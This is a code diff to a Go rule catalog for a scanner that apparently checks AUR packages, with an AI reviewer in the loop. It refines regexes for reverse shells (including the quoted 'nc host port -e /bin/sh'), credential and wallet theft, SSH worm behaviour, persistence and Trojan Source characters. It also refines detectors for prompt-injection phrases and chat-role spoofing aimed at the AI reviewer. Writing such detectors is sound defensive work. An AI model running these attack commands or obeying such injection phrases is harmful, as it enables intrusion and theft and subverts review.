@@ -61,7 +61,12 @@ var catalog = []Rule{
 	mk("PASTE-001", "Paste-site download", Critical, `(?i)(pastebin\.com|ptpb\.pw|paste\.ee|0x0\.st|transfer\.sh)`),
 	// --- Critical: reverse shells -------------------------------------------
 	mk("SHELL-001", "Bash reverse shell", Critical, `/dev/tcp/`),
-	mk("SHELL-002", "Netcat reverse shell", Critical, `(?i)\bn(c|cat)\b[^\n]*\s-e\b`),
+	// SHELL-002 requires -e to execute a SHELL. `nc -vlc -p 7998 -e 'printf …;
+	// cat /tmp/log.html'` is skywire-bin serving its log page over HTTP — a
+	// listener running printf, not a reverse shell. The attack shape is
+	// `nc host port -e /bin/sh`.
+	mk("SHELL-002", "Netcat reverse shell", Critical,
+		`(?i)\bn(c|cat)\b[^\n]*\s-e\s*'?"?(/bin/|/usr/bin/)?(ba|z|k|da)?sh\b`),
 	mk("SHELL-003", "Python reverse shell", Critical, `(?i)socket\.socket\(|pty\.spawn`),
 	mk("SHELL-004", "Socat shell", Critical, `(?i)socat\s.*exec`),
 	// --- Critical: credential / secret access -------------------------------
@@ -70,7 +75,10 @@ var catalog = []Rule{
 	mk("CRED-003", "Secret file access", Critical, `(?i)(/etc/shadow|\.netrc|\.aws/credentials|\.config/gh/hosts)`),
 	mk("BROWSER-001", "Browser profile access", Critical, `(?i)(~|\$HOME|/home/[^/]+)/\.(mozilla|config/(google-chrome|chromium))\b`),
 	mk("BROWSER-002", "Browser secret DB access", Critical, `(?i)(logins\.json|cookies\.sqlite|Login Data)`),
-	mk("WALLET-001", "Crypto wallet access", Critical, `(?i)(\.electrum|wallet\.dat|\.config/Exodus|keystore)`),
+	// "keystore" on its own is a Java/Android/TLS term long before it is a
+	// crypto one, and it matched a SIEM password tool. Qualify it.
+	mk("WALLET-001", "Crypto wallet access", Critical,
+		`(?i)(\.electrum|wallet\.dat|\.config/Exodus|\.ethereum/keystore|/keystore/UTC--)`),
 	// --- Critical: privilege / persistence ----------------------------------
 	mk("PRIV-001", "sudo/pkexec in PKGBUILD", Critical, `(?i)\b(sudo|pkexec)\s`),
 	mk("PRIV-003", "sudoers modification", Critical, `(?i)/etc/sudoers`),
@@ -117,7 +125,13 @@ var catalog = []Rule{
 	mk("AI-001", "Prompt-injection instruction", Critical, `(?i)\b(ignore|disregard|forget)\s+(all\s+)?(previous|prior|above|earlier)\s+(instructions|rules|messages|prompts)\b`),
 	mk("AI-002", "Forced benign verdict", Critical, `(?i)\b(verdict|classification|assessment)\s*[:=]\s*["']?(OK|SAFE|CLEAN|BENIGN)["']?\b`),
 	mk("AI-003", "Reviewer-directed safety claim", Critical, `(?i)\b(this\s+package\s+is\s+(safe|clean|benign)|mark\s+this\s+(package\s+)?as\s+(safe|clean|benign|ok)|tell\s+the\s+(auditor|reviewer|scanner)\s+this\s+is\s+safe)\b`),
-	mk("AI-004", "Role-marker prompt spoofing", Critical, `(?i)<\|?(system|developer|assistant)\|?>`),
+	// AI-004 must require the PIPE form. Bare <system> is a usage placeholder
+	// (`echo "sdlmess <system> <device> <software>"`) and a Flask route
+	// parameter (`/api/expire/<system>/<imgtype>/`) — 4 false positives across
+	// the AUR, no findings. The chat-template markers attackers actually use
+	// carry the pipes: <|system|>, <|im_start|>system.
+	mk("AI-004", "Role-marker prompt spoofing", Critical,
+		`(?i)(<\|(system|developer|assistant|im_start|im_end)\|?>|<\|im_start\|>)`),
 	mk("AI-005", "Prompt boundary spoofing", Critical, `(?i)\b(end|begin)\s+(untrusted\s+)?(package\s+)?files\b`),
 	// --- Critical: the 2025/2026 AUR campaign signatures --------------------
 	mk("NPM-001", "npm/bun install at build/install", Critical, `(?i)\b(npm|npx|bun|pnpm|yarn)\s+(install|add|x|run|exec)\b`),
@@ -140,13 +154,37 @@ var catalog = []Rule{
 		`(?i)\b(cp|mv|dd|tee|cat|install)\b[^\n]*\$\{?BASH_SOURCE`),
 	mk("WORM-002", "AUR maintainer SSH remote used by a package script", Critical, `(?i)aur@aur\.archlinux\.org`),
 	mk("WORM-003", "git push from a package script", Critical, `(?i)\bgit\s+push\b`),
-	mk("CRED-004", "root / all-user SSH directory enumeration", Critical, `(?i)(/root/\.ssh\b|/home/\*/\.ssh\b)`),
-	mk("CRED-005", "SSH directory moved or symlinked away", Critical, `(?i)\b(mv|ln)\b[^\n]*(~|\$HOME|/root)/\.ssh\b`),
+	// Must not fire on a path being RESTRICTED or declared. `deny /home/*/.ssh/**
+	// r,` in an AppArmor profile denies the very access this rule claims to
+	// find, and dropbear's initrd hook names /root/.ssh/authorized_keys because
+	// that is the feature. Requires a reading or traversing verb.
+	mk("CRED-004", "root / all-user SSH directory enumeration", Critical,
+		`(?i)\b(cat|cp|mv|tar|scp|rsync|find|for)\b[^\n]*(/root/\.ssh\b|/home/\*/\.ssh\b)`),
+	// The worm replaces the DIRECTORY: `mv ~/.ssh ~/.ssh.orig; ln -s <other>
+	// ~/.ssh`. `ln -sf "$SSH_AUTH_SOCK" ~/.ssh/ssh_auth_sock` is the standard
+	// ssh-agent idiom and targets a file inside it.
+	mk("CRED-005", "SSH directory moved or symlinked away", Critical,
+		`(?i)\b(mv|ln)\b[^\n]*(~|\$HOME|/root)/\.ssh(\.orig|\.bak)?(\s|$)`),
 	// install-only (see installOnly): these are unremarkable in a PKGBUILD
 	// under fakeroot but are root-level system changes in a scriptlet.
-	mk("PKGMGR-001", "pacman invoked from an install scriptlet", Critical, `(?i)\bpacman\s+-\S*S`),
+	// PKGMGR-001 must match an INSTALL, not any pacman invocation. The old
+	// pattern `(?i)pacman\s+-\S*S` matched `pacman -Qs docker` (a query),
+	// `pacman --deptest` (case-insensitive S hitting the s in "deptest") and
+	// `note "Use: pacman -S htop"` (where the command is `note`). 27 hits
+	// across the AUR, none of them installing anything. Anchored to the command
+	// position, case-sensitive, and restricted to the sync/upgrade operations —
+	// pacman's operation letters are uppercase and its suboptions lowercase, so
+	// -Qs and -S are cleanly distinguishable.
+	mk("PKGMGR-001", "pacman install invoked from an install scriptlet", Critical,
+		// -Sl (list) and -Si (info) are sync QUERIES, not installs: pacman's
+		// read-only suboptions after -S are lowercase l/i/s/g/p/c, so an
+		// install is bare -S, or -S followed only by y/u.
+		`(?m)(^|\| )pacman\s+(-[a-z]*S[yu]*|--sync|--upgrade|-[a-z]*U)(\s|$)`),
 	mk("PERSIST-007", "Remote payload written into a system binary directory", Critical,
-		`(?i)\b(curl|wget)\b[^\n]*\s/(usr/local/s?bin|usr/s?bin|opt)/`),
+		// /opt as a whole is not a binary directory: vllama downloads a GGUF
+		// model into /opt/vllama/models/ with a sha256 check. Only bin/sbin
+		// locations carry the "this will be executed" claim.
+		`(?i)\b(curl|wget)\b[^\n]*\s(/usr/local/s?bin|/usr/s?bin|/opt/[^\s/]+/s?bin)/`),
 	// No PERSIST-008. It fired on `chmod +x /usr/bin/<something the package
 	// itself installed>` — a permission fix, common in -bin packages whose
 	// upstream tarball ships wrong modes, and it hit 3 of 120 real packages
@@ -156,14 +194,27 @@ var catalog = []Rule{
 	// no fetch behind it means nothing, and this code was in fatalCodes, where
 	// a false positive makes a package permanently unpassable.
 	mk("PERSIST-009", "install scriptlet writes a systemd unit file", Critical,
-		`(?i)>\s*/(etc|usr/lib|run)/systemd/system/`),
+		// A drop-in — /etc/systemd/system/<unit>.service.d/override.conf — is
+		// the idiomatic way to adjust a unit the package already ships, and 7
+		// packages across the AUR do exactly that. The worm writes a whole new
+		// unit FILE, so the target must END in .service/.socket/.timer rather
+		// than continue into a .d directory.
+		`(?i)>\s*/(etc|usr/lib|run)/systemd/system/[^\s/]+\.(service|socket|timer)(\s|$)`),
 	// --- Critical/High: Unicode obfuscation (Trojan Source / homoglyph) ------
 	// Bidirectional controls reorder how a line *displays* vs how it parses
 	// (CVE-2021-42574); zero-width/BOM characters split tokens to evade regex
 	// and hide content. Neither has any legitimate use in a build script, so
 	// these are scanned even inside comments (see scanEvenInComments).
 	mk("UNI-001", "Bidirectional control character", Critical, `[\x{202A}-\x{202E}\x{2066}-\x{2069}\x{200E}\x{200F}]`),
-	mk("UNI-002", "Zero-width / BOM character", Critical, `[\x{200B}-\x{200D}\x{2060}\x{FEFF}]`),
+	// U+200C ZWNJ and U+200D ZWJ are REQUIRED orthography in Indic, Arabic,
+	// Persian and Thai text: `GenericName[ml]=രേഖാദര്‍ശിനി` in a .desktop file
+	// carries a ZWJ because Malayalam does not render correctly without it.
+	// Flagging those was 31 false positives and zero findings. U+200B, U+2060
+	// and the BOM have no such role in the middle of a file and are kept.
+	// A BOM at the very start of a file is an editor artefact: it hides nothing
+	// because nothing precedes it. Only a zero-width character in the MIDDLE of
+	// the text can make what you read differ from what runs.
+	mk("UNI-002", "Zero-width / BOM character", Critical, `(?s).[\x{200B}\x{2060}\x{FEFF}]`),
 	// A punycode (xn--) host in a source URL is near-never legitimate on the AUR
 	// and is a strong sign of a deliberately disguised domain.
 	mk("URL-004", "Punycode (xn--) host", High, `(?i)https?://(?:[a-z0-9.\-]+\.)?xn--`),
@@ -619,6 +670,11 @@ var executedOnly = map[string]bool{
 	// is how they refresh a checksum, not how the package behaves on your
 	// machine. makepkg never executes those files.
 	"DLE-001": true, "DLE-002": true,
+	// Same reasoning: a Telegram notification in a maintainer's
+	// check-version.sh, and an .onion address inside a .patch to Tor-adjacent
+	// software, are not the package's behaviour. Note this is executedOnly and
+	// not shellOnly — check-version.sh IS shell, it is simply never run.
+	"EXFIL-003": true, "EXFIL-004": true,
 }
 
 // isShellFile reports whether a file's content is shell at all. Rules about
@@ -647,6 +703,14 @@ var shellOnly = map[string]bool{
 	// naturally names /etc/shadow. Reading a path out of a data file says
 	// nothing about what the package does.
 	"CRED-003": true, "CRED-001": true, "CRED-002": true,
+	// A .desktop file, a translation catalogue or a README is data. Trojan
+	// Source hides its characters in code that RUNS; text that merely ships
+	// with the package cannot smuggle anything past the shell.
+	"UNI-002": true, "UNI-003": true,
+	// mpv-git ships a find-deps.py that DELETES LD_PRELOAD from the
+	// environment. Python is not shell, and removing a variable is the
+	// opposite of manipulating it.
+	"ENV-001": true, "ENV-002": true,
 }
 
 // installOnly lists rules that only make sense inside a scriptlet: in a
@@ -679,7 +743,14 @@ var fatalCodes = map[string]bool{
 	// that renames itself evades any filename test for free. Guilt lives in
 	// what the scriptlet DOES, which the codes above cover.
 	// previously known campaigns and unambiguous RCE / exfil
-	"NPM-002": true, "CRYPTO-001": true, "CRYPTO-002": true,
+	"NPM-002": true,
+	// CRYPTO-001/002 are deliberately NOT fatal. They are correct about
+	// xmrig-bin and friends — those packages ARE miners — but a
+	// non-overridable verdict stops someone deliberately installing one even
+	// when the model confirms it is exactly what its name says. fatalCodes
+	// means "no legitimate form exists"; a knowingly-installed miner has one.
+	// Mining hidden in an unrelated package is still caught, because a model
+	// would not clear that.
 	"DLE-001": true, "DLE-002": true,
 	"SHELL-001": true, "SHELL-002": true, "EXFIL-003": true,
 	"OBF-004": true, "UNI-001": true, "UNI-002": true,
